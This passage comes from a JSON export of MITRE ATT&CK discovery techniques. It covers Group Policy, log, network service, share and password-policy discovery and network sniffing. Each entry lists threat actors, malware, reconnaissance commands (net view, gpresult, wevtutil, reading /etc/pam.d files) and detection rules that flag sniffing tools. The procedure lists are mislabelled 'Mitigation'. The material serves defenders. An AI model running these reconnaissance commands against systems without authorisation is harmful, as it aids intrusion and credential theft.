        "description": "ZLib has the ability to enumerate files and drives.[200]"
      },
      {
        "id": "S0672",
        "name": "Zox",
        "description": "Zox can enumerate files on a compromised host.[343]"
      },
      {
        "id": "S0350",
        "name": "zwShell",
        "description": "zwShell can browse the file system.[207]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell has a command to open a file manager and explorer on the system.[344]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor newly executed processes that may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Group Policy Discovery",
    "Code": "T1615",
    "Description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path \\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.[1][2]Adversaries may use commands such as gpresult or various publicly available PowerShell functions, such as Get-DomainGPO and Get-DomainGPOLocalGroup, to gather information on Group Policy settings.[3][4] Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. Domain Policy Modification) for their benefit.",
    "Mitigation": [
      {
        "id": "S0521",
        "name": "BloodHound",
        "description": "BloodHound has the ability to collect local admin information via GPO.[5]"
      },
      {
        "id": "S0082",
        "name": "Emissary",
        "description": "Emissary has the capability to execute gpresult.[6]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire includes various modules for enumerating Group Policy.[4]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla surveys a system upon check-in to discover Group Policy details using the gpresult command.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Access",
        "detects": "Monitor for abnormal LDAP queries with filters for groupPolicyContainer and high volumes of LDAP traffic to domain controllers. Windows Event ID 4661 can also be used to detect when a directory service has been accessed."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor for suspicious use of gpresult. Monitor for the use of PowerShell functions such as Get-DomainGPO and Get-DomainGPOLocalGroup and processes spawning with command-line arguments containing GPOLocalGroup."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment."
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Log Enumeration",
    "Code": "T1654",
    "Description": "Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records (Account Discovery), security or vulnerable software (Software Discovery), or hosts within a compromised network (Remote System Discovery).Host binaries may be leveraged to collect system logs. Examples include using wevtutil.exe or PowerShell on Windows to access and/or export security event information.[1][2] In cloud environments, adversaries may leverage utilities such as the Azure VM Agent’s CollectGuestLogs.exe to collect security logs from cloud hosted infrastructure.[3]Adversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.",
    "Mitigation": [
      {
        "id": "S1091",
        "name": "Pacu",
        "description": "Pacu can collect CloudTrail event histories and CloudWatch logs.[4]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has used wevtutil.exe and the PowerShell command Get-EventLog security to enumerate Windows logs to search for successful logons.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor for the use of commands and arguments of utilities and other tools used to access and export logs."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for access to system and service log files, especially from unexpected and abnormal users."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for unexpected process activity associated with utilities that can access and export logs, such as wevutil.exe on Windows and CollectGuestLogs.exe on Azure hosted VMs."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Network Service Discovery",
    "Code": "T1046",
    "Description": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.[1] Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as dns-sd -B _ssh._tcp .) to find other systems broadcasting the ssh service.[2][3]",
    "Mitigation": [
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 performed network scanning on the network to search for open ports, services, OS finger-printing, and other vulnerabilities.[4]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used CrackMapExec and a custom port scanner known as BLUETORCH for network scanning.[5][6]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used a malware variant called WIDETONE to conduct port scans on specified subnets.[7]"
      },
      {
        "id": "S0093",
        "name": "Backdoor.Oldrea",
        "description": "Backdoor.Oldrea can use a network scanning module to identify ICS-related ports.[8]"
      },
      {
        "id": "G0135",
        "name": "BackdoorDiplomacy",
        "description": "BackdoorDiplomacy has used SMBTouch, a vulnerability scanner, to determine whether a target is vulnerable to EternalBlue malware.[9]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can check for open ports on a computer by establishing a TCP connection.[10]"
      },
      {
        "id": "S0089",
        "name": "BlackEnergy",
        "description": "BlackEnergy has conducted port scans on a host.[11]"
      },
      {
        "id": "G0098",
        "name": "BlackTech",
        "description": "BlackTech has used the SNScan tool to find other potential targets on victim networks.[12]"
      },
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 can conduct port scanning against targeted systems.[13]"
      },
      {
        "id": "C0018",
        "name": "C0018",
        "description": "During C0018, the threat actors used the SoftPerfect Network Scanner for network scanning.[14]"
      },
      {
        "id": "C0027",
        "name": "C0027",
        "description": "During C0027, used RustScan to scan for open ports on targeted ESXi appliances.[15]"
      },
      {
        "id": "S0572",
        "name": "Caterpillar WebShell",
        "description": "Caterpillar WebShell has a module to use a port scanner on a system.[16]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used the get -b  -e  -p command for network scanning as well as a custom Python tool  packed into a Windows executable named Get.exe to scan IP ranges for HTTP.[17]"
      },
      {
        "id": "S0020",
        "name": "China Chopper",
        "description": "China Chopper's server component can spider authentication portals.[18]"
      },
      {
        "id": "G0080",
        "name": "Cobalt Group",
        "description": "Cobalt Group leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.[19][20][21]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can perform port scans from an infected host.[22][23][24]"
      },
      {
        "id": "S0608",
        "name": "Conficker",
        "description": "Conficker scans for other machines to infect.[25]"
      },
      {
        "id": "C0004",
        "name": "CostaRicto",
        "description": "During CostaRicto, the threat actors employed nmap and pscan to scan target environments.[26]"
      },
      {
        "id": "G0105",
        "name": "DarkVishnya",
        "description": "DarkVishnya performed port scanning to obtain the list of active services.[27]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can perform port scans from an infected host.[28]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has utilized nmap for reconnaissance efforts. FIN13 has also scanned for internal MS-SQL servers in a compromised network.[29][30]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.[31]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has used tools including NMAP to conduct broad scanning to identify open ports.[32][33]"
      },
      {
        "id": "S0061",
        "name": "HDoor",
        "description": "HDoor scans to identify open ports on the victim.[34]"
      },
      {
        "id": "S0698",
        "name": "HermeticWizard",
        "description": "HermeticWizard has the ability to scan ports on a compromised network.[35]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard has used masscan to look for kubelets in the internal Kubernetes network.[36]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer uses a custom port scanner to map out a network.[37]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can scan the network for open ports and vulnerable instances of RDP and SMB protocols.[38]"
      },
      {
        "id": "S0250",
        "name": "Koadic",
        "description": "Koadic can scan for open TCP ports on the target network.[39]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has used nmap from a router VM to scan ports on systems within the restricted segment of an enterprise network.[40]"
      },
      {
        "id": "G0077",
        "name": "Leafminer",
        "description": "Leafminer scanned network services to search for vulnerabilities in the victim system.[41]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can scan for open ports including TCP ports 135 and 1433.[42]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has used KPortScan 3.0 to perform SMB, RDP, and LDAP scanning.[43]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used tcping.exe, similar to Ping, to probe port status on systems of interest.[44]"
      },
      {
        "id": "S0233",
        "name": "MURKYTOP",
        "description": "MURKYTOP has the capability to scan for open ports on hosts in a connected network.[18]"
      },
      {
        "id": "G0019",
        "name": "Naikon",
        "description": "Naikon has used the LadonGo scanner to scan target networks.[45]"
      },
      {
        "id": "S0590",
        "name": "NBTscan",
        "description": "NBTscan can be used to scan IP networks.[46][47]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.[48]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors scanned for open ports and used nbtscan to find NETBIOS nameservers.[49]"
      },
      {
        "id": "S0598",
        "name": "P.A.S. Webshell",
        "description": "P.A.S. Webshell can scan networks for open ports and listening services.[50]"
      },
      {
        "id": "S0683",
        "name": "Peirates",
        "description": "Peirates can initiate a port scan against a given IP address.[51]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 can perform port scans from an infected host.[52]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy has a built-in module for port scanning.[53]"
      },
      {
        "id": "S0583",
        "name": "Pysa",
        "description": "Pysa can perform network reconnaissance using the Advanced Port Scanner tool.[54]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can scan for systems that are vulnerable to the EternalBlue exploit.[55][56]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec has a plugin that can perform ARP scanning as well as port scanning.[57]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke conducted scanning for exposed TCP port 7001 as well as SSH and Redis servers.[58][59]"
      },
      {
        "id": "S1073",
        "name": "Royal",
        "description": "Royal can scan the network interfaces of targeted systems.[60]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can scan for open ports on a compromised machine.[61]"
      },
      {
        "id": "S0374",
        "name": "SpeakUp",
        "description": "SpeakUp checks for availability of specific ports on servers.[62]"
      },
      {
        "id": "G0039",
        "name": "Suckfly",
        "description": "Suckfly the victim's internal network for hosts with ports 8080, 5900, and 40 open.[63]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has used masscan to search for open Docker API ports and Kubernetes clusters.[64][36][65] TeamTNT has also used malware that utilizes zmap and zgrab to search for vulnerable services in cloud environments.[66]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 actors use the Hunter tool to conduct network service discovery for vulnerable systems.[67][68]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper used pr and an openly available tool to scan for open ports on target systems.[69][70]"
      },
      {
        "id": "S0341",
        "name": "Xbash",
        "description": "Xbash can perform port scanning of TCP and UDP ports.[71]"
      },
      {
        "id": "S0117",
        "name": "XTunnel",
        "description": "XTunnel is capable of probing the network for open ports.[72]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell can launch port scans.[7][73]"
      }
    ],
    "Detection": [
      {
        "id": "DS0025",
        "dsource": "Cloud Service",
        "dcomp": "Cloud Service Enumeration",
        "detects": "Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.Normal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. It should be noted that when a host/ port/ service scan is performed from a compromised machine, a single machine makes multiple calls to other hosts in the network to identify live hosts and services.After compromising an initial machine, adversaries commonly attempt to laterally move across the network. The first step to attempt the Lateral Movement often involves conducting host identification, port and service scans on the internal network via the compromised machine using tools such as Nmap, Cobalt Strike, etc.Analytic 1 - Identifying Port Scanning Activityflow = filter flow where (src_type = \"firewall_logs\" AND dest_ip = \"internal_subnet\" )"
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Network Share Discovery",
    "Code": "T1135",
    "Description": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. File sharing over a Windows network occurs over the SMB protocol. [1] [2] Net can be used to query a remote system for available shared drives using the net view \\\\remotesystem command. It can also be used to query shared drives on the local system using net share. For macOS, the sharing -l command lists all shared points used for smb services.",
    "Mitigation": [
      {
        "id": "G0006",
        "name": "APT1",
        "description": "APT1 listed connected network shares.[3]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 used the net view command to show all shares available, including the administrative shares such as C$ and ADMIN$.[4]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 has enumerated network shares on a compromised host.[5]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used the post exploitation tool CrackMapExec to enumerate network shares.[6]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used the net share command as part of network reconnaissance.[7][8]"
      },
      {
        "id": "S0640",
        "name": "Avaddon",
        "description": "Avaddon has enumerated shared folders and mapped volumes.[9]"
      },
      {
        "id": "S1053",
        "name": "AvosLocker",
        "description": "AvosLocker has enumerated shared drives on a compromised network.[10][11]"
      },
      {
        "id": "S0638",
        "name": "Babuk",
        "description": "Babuk has the ability to enumerate network shares.[12]"
      },
      {
        "id": "S0606",
        "name": "Bad Rabbit",
        "description": "Bad Rabbit enumerates open SMB shares on internal victim networks.[13]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can check a user's access to the C$ share on a compromised machine.[14]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can enumerate shared drives on the domain.[15]"
      },
      {
        "id": "S0570",
        "name": "BitPaymer",
        "description": "BitPaymer can search for network shares on the domain or workgroup using net view .[16]"
      },
      {
        "id": "S1068",
        "name": "BlackCat",
        "description": "BlackCat has the ability to discover network shares on compromised networks.[17][18]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors executed the PowerView ShareFinder module to identify open shares.[19]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used net share and net view to identify network shares of interest.[20]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling has the ability to enumerate network shares.[21]"
      },
      {
        "id": "S0611",
        "name": "Clop",
        "description": "Clop can enumerate network shares.[22]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can query shared drives on the local system.[23]"
      },
      {
        "id": "S0575",
        "name": "Conti",
        "description": "Conti can enumerate remote open SMB network shares using NetShareEnum().[24][25]"
      },
      {
        "id": "S0488",
        "name": "CrackMapExec",
        "description": "CrackMapExec can enumerate the shared folders and associated permissions for a targeted network.[26]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba can discover shared resources using the NetShareEnum API call.[27]"
      },
      {
        "id": "G0105",
        "name": "DarkVishnya",
        "description": "DarkVishnya scanned the network for public shared folders.[28]"
      },
      {
        "id": "S0616",
        "name": "DEATHRANSOM",
        "description": "DEATHRANSOM has the ability to use loop operations to enumerate network resources.[29]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol has a ENMDSKS command to enumerates available network shares.[30]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.[31]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has enumerated non-hidden network shares using WNetEnumResourceW. [32]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can find shared drives on the local system.[33]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has executed net view commands for enumeration of open shares on compromised machines.[34][35]"
      },
      {
        "id": "S0618",
        "name": "FIVEHANDS",
        "description": "FIVEHANDS can enumerate network shares and mounted drives on a network.[36]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro has been used to execute net view to discover mapped network shares.[37]"
      },
      {
        "id": "S0617",
        "name": "HELLOKITTY",
        "description": "HELLOKITTY has the ability to enumerate network resources.[29]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can gather network share information.[38]"
      },
      {
        "id": "S0250",
        "name": "Koadic",
        "description": "Koadic can scan local network for open SMB.[39]"
      },
      {
        "id": "S1075",
        "name": "KOPILUWAK",
        "description": "KOPILUWAK can use netstat and Net to discover network shares.[40]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs collects a list of network shares with the command net share.[41]"
      },
      {
        "id": "S0233",
        "name": "MURKYTOP",
        "description": "MURKYTOP has the capability to retrieve information about shares on remote hosts.[42]"
      },
      {
        "id": "S0039",
        "name": "Net",
        "description": "The net view \\remotesystem and net share commands in Net can be used to find shared drives and directories on remote and local systems respectively.[43]"
      },
      {
        "id": "S0365",
        "name": "Olympic Destroyer",
        "description": "Olympic Destroyer will attempt to enumerate mapped network shares to later attempt to wipe all files on those shares.[44]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors used the net share command as part of their advanced reconnaissance.[45]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors discovered network disks mounted to the system using netstat.[46]"
      },
      {
        "id": "S0165",
        "name": "OSInfo",
        "description": "OSInfo discovers shares on the network[47]"
      },
      {
        "id": "S0013",
        "name": "PlugX",
        "description": "PlugX has a module to enumerate network shares.[48]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy can list local and remote shared drives and folders over SMB.[49]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can use net share to identify network shares for use in lateral movement.[50][51]"
      },
      {
        "id": "S0686",
        "name": "QuietSieve",
        "description": "QuietSieve can identify and search networked drives for specific file name extensions.[52]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can scan for network drives which may contain documents for collection.[53][54]"
      },
      {
        "id": "S1073",
        "name": "Royal",
        "description": "Royal can enumerate the shared resources of a given IP addresses using the API call NetShareEnum.[55]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic has the ability to execute the net view command.[56]"
      },
      {
        "id": "S0444",
        "name": "ShimRat",
        "description": "ShimRat can enumerate connected drives for infected host machines.[57]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can enumerate shares on a compromised host.[58]"
      },
      {
        "id": "G0054",
        "name": "Sowbug",
        "description": "Sowbug listed remote shared drives that were accessible from a victim.[59]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet enumerates the directories of a network resource.[60]"
      },
      {
        "id": "G0131",
        "name": "Tonto Team",
        "description": "Tonto Team has used tools such as NBTscan to enumerate network shares.[61]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot module shareDll/mshareDll discovers network shares via the WNetOpenEnumA API.[62][63]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper used netview to scan target systems for shared resources.[64]"
      },
      {
        "id": "S0612",
        "name": "WastedLocker",
        "description": "WastedLocker can identify network adjacent and accessible drives.[65]"
      },
      {
        "id": "S0689",
        "name": "WhisperGate",
        "description": "WhisperGate can enumerate connected remote logical drives.[66]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used the \"net view\" command to locate mapped network shares.[67]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy identifies network drives when they are added to victim systems.[68]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Network Sniffing",
    "Code": "T1040",
    "Description": "Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.[1][2][3] Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.[4][5] The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.[4]On network devices, adversaries may perform network captures using Network Device CLI commands such as monitor capture.[6][7]",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy’s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid’s industrial control systems. [8]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.[9][10] APT28 close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials.[11]"
      },
      {
        "id": "G0064",
        "name": "APT33",
        "description": "APT33 has used SniffPass to collect credentials by sniffing network traffic.[12]"
      },
      {
        "id": "G0105",
        "name": "DarkVishnya",
        "description": "DarkVishnya used network sniffing to obtain login data. [13]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has been observed to hook network APIs to monitor network traffic. [14]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can be used to conduct packet captures on target hosts.[15]"
      },
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb can configure custom listeners to passively monitor all incoming HTTP GET and POST requests sent to the AD FS server from the intranet/internet and intercept HTTP requests that match the custom URI patterns defined by the actor.[16]"
      },
      {
        "id": "S0357",
        "name": "Impacket",
        "description": "Impacket can be used to sniff network traffic via an interface or raw socket.[17]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols.[18][19]"
      },
      {
        "id": "S0443",
        "name": "MESSAGETAP",
        "description": "MESSAGETAP uses the libpcap library to listen to all traffic and parses network protocols starting with Ethernet and IP layers. It continues parsing protocol layers including SCTP, SCCP, and TCAP and finally extracts SMS message data and routing metadata.  [20]"
      },
      {
        "id": "S0590",
        "name": "NBTscan",
        "description": "NBTscan can dump and print whole packet content.[21][22]"
      },
      {
        "id": "S0587",
        "name": "Penquin",
        "description": "Penquin can sniff network traffic to look for packets matching specific conditions.[23][24]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 contains a module for taking packet captures on compromised hosts.[25]"
      },
      {
        "id": "S0019",
        "name": "Regin",
        "description": "Regin appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB.[26]"
      },
      {
        "id": "S0174",
        "name": "Responder",
        "description": "Responder captures hashes and credentials that are sent to the system after the name services have been poisoned.[27]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used intercepter-NG to sniff passwords in network traffic.[28]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that aid in sniffing network traffic to capture information about an environment, including authentication material passed over the network"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that can aid in sniffing network traffic to capture information about an environment, including authentication material passed over the network Note: The Analytic is for Windows systems and looks for new processes that have the names of the most common network sniffing tools. While this may be noisy on networks where sysadmins are using any of these tools on a regular basis, in most networks their use is noteworthy.Analytic 1 - Windowsprocesses = filter processes where ((event_id == \"1\" OR event_id == \"4688\") ANDexe == \"tshark.exe\" ORexe == \"windump.exe\" OR(exe == \"logman.exe\" AND parent_exe exists AND parent_exe!=\"C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.AgentService.exe\") ORexe == \"tcpdump.exe\" ORexe == \"wprui.exe\" ORexe == \"wpr.exe\" )"
      }
    ],
    "Subtechniques": "CredentialAccess, Discovery"
  },
  {
    "Title": "Password Policy Discovery",
    "Code": "T1201",
    "Description": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as net accounts (/domain), Get-ADDefaultDomainPasswordPolicy, chage -l , cat /etc/pam.d/common-password, and pwpolicy getaccountpolicies [1] [2]. Adversaries may also leverage a Network Device CLI on network devices to discover password policy information (e.g. show aaa, show aaa common-criteria policy all).[3]Password policies can be discovered in cloud environments using available APIs such as GetAccountPasswordPolicy in AWS [4].",
    "Mitigation": [
      {
        "id": "S0521",
        "name": "BloodHound",
        "description": "BloodHound can collect password policy information on the target environment.[5]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
